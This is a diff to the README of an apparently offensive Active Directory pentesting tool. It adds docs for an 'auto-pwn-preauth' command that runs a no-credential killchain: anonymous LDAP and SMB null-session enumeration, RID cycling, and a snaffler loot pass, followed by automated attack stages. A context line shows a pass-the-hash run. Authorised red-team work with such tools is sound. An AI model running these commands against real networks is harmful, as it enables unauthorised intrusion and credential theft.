@@ -5,6 +5,7 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
 <p align="center">
   <b>Autopwn</b><br/>
   <a href="#ovt-auto-pwn---the-hold-my-beer-button">auto-pwn</a> &nbsp;·&nbsp;
+  <a href="#ovt-auto-pwn-preauth---no-creds-bootstrap-autopwn">auto-pwn-preauth</a> &nbsp;·&nbsp;
   <a href="#ovt-wizard---interactive-guided-mode">wizard</a>
 </p>
 
@@ -127,6 +128,33 @@ ovt auto-pwn -H 10.10.10.1 -d corp.local -u admin --nt-hash aad3b435b51404ee:884
 
 Aliases: `ovt auto`, `ovt autopwn`
 
+---
+
+## `ovt auto-pwn-preauth` - No-Creds Bootstrap Autopwn
+
+Starts the killchain from a no-credential foothold. It runs pre-auth triage first, then continues into planner/executor stages.
+
+```bash
+# Minimal no-creds run (domain auto-discovery attempted via anonymous RootDSE)
+ovt auto-pwn-preauth -H 10.10.10.1
+
+# Recommended when domain is known
+ovt auto-pwn-preauth -H 10.10.10.1 -d corp.local
+
+# Stealth + stage limit
+ovt auto-pwn-preauth -H 10.10.10.1 -d corp.local --stealth --max-stage attack
+```
+
+Bootstrap sequence:
+- `ovt enum pre` (ports + anonymous LDAP + anonymous LDAPS + SMB null session probe)
+- `ovt enum anonymous`
+- `ovt rid --null-session`
+- pre-auth `snaffler` loot pass (writes `loot/preauth_snaffler_findings.json`)
+
+Then it transitions to normal `pilot` planner stages and continues as far as available access allows.
+
+Aliases: `ovt autopwn-preauth`, `ovt auto-preauth`
+
 **The Killchain Stages:**
 
 ```
@@ -229,6 +257,9 @@ ovt enum pre -H 10.10.10.1
 ovt enum anonymous -H 10.10.10.1
 ovt enum null-session -H 10.10.10.1
 ovt rid -H 10.10.10.1 --null-session --start-rid 500 --end-rid 1100
+
+# Validate tooling + pre-auth dependencies on Kali/Linux
+ovt doctor --checks deps --target-dc 10.10.10.1
 ```
 
 | Flag | Default | What it does |
